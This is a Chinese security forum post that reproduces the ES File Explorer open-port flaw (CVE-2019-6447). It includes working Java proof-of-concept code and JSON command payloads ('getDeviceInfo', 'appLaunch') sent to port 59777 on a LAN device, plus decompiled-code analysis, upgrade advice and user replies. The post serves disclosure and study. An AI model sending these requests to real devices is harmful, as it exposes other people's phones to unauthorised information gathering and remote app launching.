> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/forum.php?mod=viewthread&tid=856993&highlight=CVE-2019-6447) ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)1941368542  今天看到关于 ES 文件浏览器的漏洞，觉得危险程度非常高，所以我简单的用 java 代码复现一下，首先关于 ES 文件浏览器，我就不多说了。非常著名的一款文件浏览器。  
漏洞利用就是该软件运行之后开启 TCP 59777 端口，该端口未关闭导致可以通过 HTTP 协议 POST 请求接收 JSON 数据，进行解析执行返回结果。  
环境：  
win10，IDEA，JDK 1.8.0_181，一加 5，Android P，ES 文件浏览器 4.1.9.7.4 之前 (我用的 4.1.8.3.1)  
  
  
复现：  
[Java] _纯文本查看_ _复制代码_

```
public class Test {
    public static void main(String[] args) {
String data = "{\"command\":\"getDeviceInfo\"}";
String path = "http://192.168.43.111:59777";
        URL url = null;
        try{
            url = new URL(path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(5000);
            conn.setRequestProperty("User-Agent","curl/7.54.0");
            conn.setRequestProperty("Accept","*/*");
            conn.setRequestProperty("Content-Type","application/json");
            conn.setRequestProperty("Content-Length",data.length()+"");
            conn.setRequestProperty("Connection","close");
            conn.setDoOutput(true);
            conn.getOutputStream().write(data.getBytes());
            //获取响应码
            int code = conn.getResponseCode();
            System.out.println("响应码:"+code);
            //如果请求码为200
            if(code == 200){
                InputStream in = conn.getInputStream();
                String msg = tools.transStream(in);
                System.out.println(msg);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}

```

返回结果：  
[Java] _纯文本查看_ _复制代码_

```
{"name":"ONEPLUS A5000", "ftpRoot":"/sdcard", "ftpPort":"3721"}

```

可以看到，我们通过 POST 请求提交了[Java] _纯文本查看_ _复制代码_

```
{"command":"getDeviceInfo"}

```

指令，就返回了我们手机的设备信息，更甚至我们可以通过指令来打开我们设备上安装的应用程序：  
POST 提交：  
[Java] _纯文本查看_ _复制代码_

```
{"command":"appLaunch", "appPackageName": "com.tencent.mm"}

```

提交该 json 数据，则可以直接打开我们手机上安装的微信。见 GIF 图  
![](https://attach.52pojie.cn/forum/201901/22/083328jvsw6ie6iece9cc6.gif)

**8.gif** _(599.99 KB, 下载次数: 2)_

[下载附件](forum.php?mod=attachment&aid=MTM0NzYwM3wxNmNlZmY2Y3wxNjIzOTExNzA1fDIxMzQzMXw4NTY5OTM%3D&nothumb=yes)

2019-1-22 08:33 上传

  
**漏洞简要分析：**  
本次漏洞主要在：  
com.estrongs.fs.impl.adb.c  
com.estrongs.android.f.a  
这两个类里面，解压 ES 文件浏览器，得到 4 个 dex 文件  
![](https://attach.52pojie.cn/forum/201901/22/083428mz5363hz6hwyss3z.png)

**1.png** _(16.18 KB, 下载次数: 2)_

[下载附件](forum.php?mod=attachment&aid=MTM0NzYwNXw2MmIzZDFhNXwxNjIzOTExNzA1fDIxMzQzMXw4NTY5OTM%3D&nothumb=yes)

2019-1-22 08:34 上传

  
挨个使用 jadx 打开搜索 command 关键字，找到漏洞关键位置  
在 classes2.dex 中定位到 com.estrongs.android.f.a  
可以看到在 a 方法内  
![](https://attach.52pojie.cn/forum/201901/22/083456h4c1dadtdt4z149b.png)

**2.png** _(52.45 KB, 下载次数: 3)_

[下载附件](forum.php?mod=attachment&aid=MTM0NzYwNnw0Y2Y5MWIwMnwxNjIzOTExNzA1fDIxMzQzMXw4NTY5OTM%3D&nothumb=yes)

2019-1-22 08:34 上传

  
通过 command 获取到对应的指令，然后执行相应的方法，  
这里我就简单看一下获取设备信息的这条执指令：  
![](https://attach.52pojie.cn/forum/201901/22/083519vx00f6jr0pu83zov.png)

**3.png** _(26.38 KB, 下载次数: 3)_

[下载附件](forum.php?mod=attachment&aid=MTM0NzYwN3xhYjIwYjMyNnwxNjIzOTExNzA1fDIxMzQzMXw4NTY5OTM%3D&nothumb=yes)

2019-1-22 08:35 上传

  
在这里，如果[Java] _纯文本查看_ _复制代码_

```
str3.equals("getDeviceInfo")

```

成立，  
则执行 b 这个方法，并将 jSONObject 传进去，我们下拉定位到 b 这个方法  
![](https://attach.52pojie.cn/forum/201901/22/083600ydcb19vvw1t946wx.png)

**4.png** _(36.85 KB, 下载次数: 3)_

[下载附件](forum.php?mod=attachment&aid=MTM0NzYwOHxiZTNmMjllMXwxNjIzOTExNzA1fDIxMzQzMXw4NTY5OTM%3D&nothumb=yes)

2019-1-22 08:36 上传

  
可以看到这个方法是通过 StringBuilder，进行拼接设备信息，  
和 ftpPort 信息，然后进行返回。在看一下启动应用程序这条指令：  
![](https://attach.52pojie.cn/forum/201901/22/083635qp7zzccybgcpjb9b.png)

**5.png** _(23.83 KB, 下载次数: 1)_

[下载附件](forum.php?mod=attachment&aid=MTM0NzYwOXxlMzM2NDJkM3wxNjIzOTExNzA1fDIxMzQzMXw4NTY5OTM%3D&nothumb=yes)

2019-1-22 08:36 上传

  
可以看到如果传来指令为 appLaunch，  
则执行 a 这个方法，并将 jSONObject 传递过去，下拉定位到 a 这个方法，  
![](https://attach.52pojie.cn/forum/201901/22/083654e84qp4zpjvjjz6kk.png)

**6.png** _(52.97 KB, 下载次数: 3)_

[下载附件](forum.php?mod=attachment&aid=MTM0NzYxMHwwYzNmZjFlMnwxNjIzOTExNzA1fDIxMzQzMXw4NTY5OTM%3D&nothumb=yes)

2019-1-22 08:36 上传

  
可以看到，他通过获取 appPackageName 对应的 String，  
然后进行非空判断，通过 Intent 将 appPackageName 对应的包名传入，  
然后通过 startActivity 启动该应用程序。通过以上分析，我们可以看出，ES 可以执行的指令还是很多的，有些危害还是比较严重的，  
所以目前使用 ES 文件浏览器的，请尽快升级到最新版本。  
![](https://attach.52pojie.cn/forum/201901/22/083724biq9jjri6oijj9j7.png)

**7.png** _(37.88 KB, 下载次数: 1)_

[下载附件](forum.php?mod=attachment&aid=MTM0NzYxMXxkNWYxMGY0MHwxNjIzOTExNzA1fDIxMzQzMXw4NTY5OTM%3D&nothumb=yes)

2019-1-22 08:37 上传

  
可以看到最新版是已经修复了该漏洞了。  
**本文同步发布于我的个人博客和吾爱[破解](https://www.52pojie.cn)，转载请注明链接。**  
**参考：**  
https://github.com/fs0c131y/ESFileExplorerOpenPortVuln  
![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)1941368542 

> [smuuupl 发表于 2019-1-22 15:52](https://www.52pojie.cn/forum.php?mod=redirect&goto=findpost&pid=23706567&ptid=856993)  
> 这么看，这不是 ES 文件浏览器内置的功能吗，咋还算上漏洞了。

是内置功能，但是不能任意人都可以向设备发送执行指令，最起码要对传入指令的身份合法性做一下校验。![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)1941368542 

> [pikachu888 发表于 2019-1-22 09:23](https://www.52pojie.cn/forum.php?mod=redirect&goto=findpost&pid=23700751&ptid=856993)  
> 请问一下, 这个漏洞是只针对局域网吗? 如果是自己家里的局域网没有别人的设备是不是没有影响

是的，局域网。![](https://avatar.52pojie.cn/data/avatar/000/32/58/10_avatar_middle.jpg)ty186  啊啊！我还在用这个浏览器啊！要不要删除呢！！？![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)JinDex 

> [ty186 发表于 2019-1-22 08:59](https://www.52pojie.cn/forum.php?mod=redirect&goto=findpost&pid=23700309&ptid=856993)  
> 啊啊！我还在用这个浏览器啊！要不要删除呢！！？

删除吧, 不要用了![](https://static.52pojie.cn/static/image/smiley/default/17.gif) ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) yang19950324 看来是时候给我的 ES 文件浏览器升级一下了 ![](https://avatar.52pojie.cn/data/avatar/000/49/05/83_avatar_middle.jpg) DEFwa 收藏一个备用，谢谢啦 ![](https://avatar.52pojie.cn/data/avatar/000/81/00/07_avatar_middle.jpg) pikachu888 请问一下, 这个漏洞是只针对局域网吗? 如果是自己家里的局域网没有别人的设备是不是没有影响![](https://static.52pojie.cn/static/image/smiley/laohu/laohu8.gif) ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) l1679668663嗯哼    还得多看会 ![](https://avatar.52pojie.cn/data/avatar/000/29/56/33_avatar_middle.jpg)iamprole  还好我一直用的 x-prole。![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)goinfor2008  看了这贴子，虽然不懂代码，还是赶紧把 ES 文件浏览器升级一下安全些。谢谢 LZ